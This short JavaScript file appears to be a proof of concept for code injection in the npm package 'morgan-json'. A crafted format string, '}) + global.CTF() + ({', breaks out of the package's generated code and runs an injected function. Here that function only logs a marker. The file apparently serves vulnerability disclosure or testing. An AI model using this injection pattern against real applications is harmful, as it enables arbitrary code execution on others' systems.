var PUT = require('morgan-json'); 
global.CTF = function() { 
    console.log('GLOBAL CTF HIT'); 
}; 
var x = '}) + global.CTF() + ({' 
try { 
    new PUT(x,{})(''); 
} catch (e) { 
    console.log(e); 
}
